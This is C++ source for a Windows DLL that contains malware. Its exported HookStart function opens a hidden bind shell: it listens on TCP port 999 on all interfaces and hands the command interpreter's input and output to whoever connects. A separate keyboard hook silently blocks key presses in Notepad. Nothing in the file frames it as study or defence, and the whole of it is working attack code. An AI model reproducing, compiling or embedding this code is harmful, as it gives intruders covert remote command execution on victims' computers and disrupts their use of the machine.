#pragma comment(lib, "ws2_32.lib")
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#define MasterPort 999

#include "stdio.h"
#include "pch.h"

HINSTANCE HInstance = NULL;
HHOOK Hook = NULL;

extern "C" __declspec(dllexport) void HookStart();

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason_for_call, LPVOID lpvReserved)
{
    switch (reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        HInstance = hinstDLL;

        break;
    }
    case DLL_PROCESS_DETACH:
    {
        break;
    }
    case DLL_THREAD_ATTACH:
    {
        break;
    }
    case DLL_THREAD_DETACH:
    {
        break;
    }
    }

    return TRUE;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    char szPath[MAX_PATH] = { 0, };
    char* p = NULL;

    if (nCode >= 0)
    {
        // bit 31 : 0 => press, 1 => release
        if (!(lParam & 0x80000000))
        {
            GetModuleFileNameA(NULL, szPath, MAX_PATH);
            p = strrchr(szPath, '\\');
            if (!_stricmp(p + 1, "notepad.exe"))
                return 1;
        }
    }

    return CallNextHookEx(Hook, nCode, wParam, lParam);
}

void HookStart() {
    WSADATA WSADa;
    sockaddr_in SockAddrIn;
    SOCKET CSocket, SSocket;
    int iAddrSize;
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo;
    TCHAR szCMDPath[255];

    ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&WSADa, sizeof(WSADATA));

    GetEnvironmentVariable(TEXT("COMSPEC"), szCMDPath, sizeof(szCMDPath));

    WSAStartup(0x0202, &WSADa);

    SockAddrIn.sin_family = AF_INET;
    SockAddrIn.sin_addr.s_addr = INADDR_ANY;
    SockAddrIn.sin_port = htons(MasterPort);
    CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    bind(CSocket, (sockaddr*)&SockAddrIn, sizeof(SockAddrIn));

    listen(CSocket, 1);
    iAddrSize = sizeof(SockAddrIn);

    SSocket = accept(CSocket, (sockaddr*)&SockAddrIn, &iAddrSize);
    StartupInfo.cb = sizeof(STARTUPINFO);
    StartupInfo.wShowWindow = SW_HIDE;
    StartupInfo.dwFlags = STARTF_USESTDHANDLES |
        STARTF_USESHOWWINDOW;
    StartupInfo.hStdInput = (HANDLE)SSocket;
    StartupInfo.hStdOutput = (HANDLE)SSocket;
    StartupInfo.hStdError = (HANDLE)SSocket;

    CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
    CloseHandle(ProcessInfo.hProcess);
    CloseHandle(ProcessInfo.hThread);

    closesocket(CSocket);
    closesocket(SSocket);
    WSACleanup();

    system("pause");
}